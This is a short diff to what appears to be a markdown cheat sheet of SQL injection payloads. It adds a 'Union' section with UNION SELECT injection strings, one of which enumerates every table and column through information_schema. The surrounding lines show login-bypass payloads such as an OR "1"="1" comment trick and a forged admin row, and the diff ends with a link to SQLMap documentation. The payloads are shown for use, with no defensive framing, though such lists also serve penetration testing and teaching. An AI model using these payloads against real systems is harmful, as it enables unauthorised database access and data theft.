@@ -99,6 +99,12 @@ admin") or "1"="1"/*
 1234 " AND 1=0 UNION ALL SELECT "admin", "81dc9bdb52d04dc20036dbd8313ed055
 ```
 
+## Union
+```
+1' UNION SELECT 1,2,3
+1' union select table_schema, table_name, column_name from information_schema.columns;
+```
+
 ## SQLMap
 Documentation [here](https://github.com/sqlmapproject/sqlmap)
 
